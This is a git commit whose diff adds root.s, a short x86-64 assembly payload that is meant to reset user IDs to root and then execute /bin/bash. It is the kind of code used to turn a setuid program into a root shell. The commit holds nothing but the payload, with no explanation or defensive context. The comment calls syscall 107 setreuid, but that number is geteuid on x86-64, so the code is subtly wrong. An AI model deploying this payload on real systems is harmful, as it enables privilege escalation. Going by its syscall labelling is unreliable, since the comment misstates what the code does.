d750775f4ccab10e40569b2d6718d12930805ec0
Gutolis <padilha.augusto@escola.pr.gov.br>
2025-11-03 21:15:17 -0300

    realizando

--- root.s
+++ root.s
@@ -1,1 +1,19 @@
-404: Not Found
+.section .text
+.globl _start
+
+_start:
+    /* setreuid(0,0) */
+    xor     %rdi, %rdi
+    xor     %rsi, %rsi
+    mov     $107, %rax
+    syscall
+
+    /* execve("/bin/bash", NULL, NULL) */
+    mov     $59, %rax
+    lea     path(%rip), %rdi
+    xor     %rsi, %rsi
+    xor     %rdx, %rdx
+    syscall
+
+path:
+    .string "/bin/bash"
